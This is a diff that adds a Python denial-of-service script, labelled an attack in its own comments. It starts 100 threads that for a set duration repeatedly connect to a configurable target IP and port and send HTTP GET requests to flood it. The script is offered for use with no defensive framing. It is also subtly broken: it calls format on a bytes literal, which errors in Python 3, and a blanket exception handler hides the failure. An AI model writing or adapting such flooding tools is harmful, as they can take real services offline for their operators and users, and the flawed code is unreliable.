@@ -1,0 +1,38 @@
+import socket
+import threading
+import time
+
+# Configuration
+TARGET_IP = '127.0.0.1'
+TARGET_PORT = 80
+THREAD_COUNT = 100
+DURATION = 60  # Attack duration in seconds
+
+def attack():
+    try:
+        start_time = time.time()
+        while time.time() - start_time < DURATION:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            try:
+                sock.connect((TARGET_IP, TARGET_PORT))
+                sock.sendto(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(TARGET_IP).encode(), (TARGET_IP, TARGET_PORT))
+            except socket.error:
+                pass
+            finally:
+                sock.close()
+    except Exception as e:
+        pass
+
+def main():
+    threads = []
+    for _ in range(THREAD_COUNT):
+        thread = threading.Thread(target=attack)
+        thread.start()
+        threads.append(thread)
+    
+    for thread in threads:
+        thread.join()
+
+if __name__ == "__main__":
+    main()
